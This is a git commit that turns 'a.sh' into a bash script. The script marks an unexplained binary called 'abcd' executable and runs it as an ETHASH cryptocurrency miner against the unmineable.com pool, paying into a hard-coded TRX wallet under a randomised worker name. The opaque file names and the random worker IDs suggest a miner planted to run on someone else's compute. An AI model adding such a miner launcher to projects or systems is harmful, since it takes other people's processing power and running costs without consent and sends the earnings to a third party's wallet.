d9f1fae3cd45eff1c9b46b27f7235cb16c4d7c58
pruabhi0 <87109060+pruabhi0@users.noreply.github.com>
2021-07-14 09:28:33 +0000

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,1 +1,6 @@
-a
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:TCxCjhyFyzH3GUqt2n9wt8zn7WN5arjzCs
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-abhi#bdfc-cm6i)
+chmod +x abcd
+./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
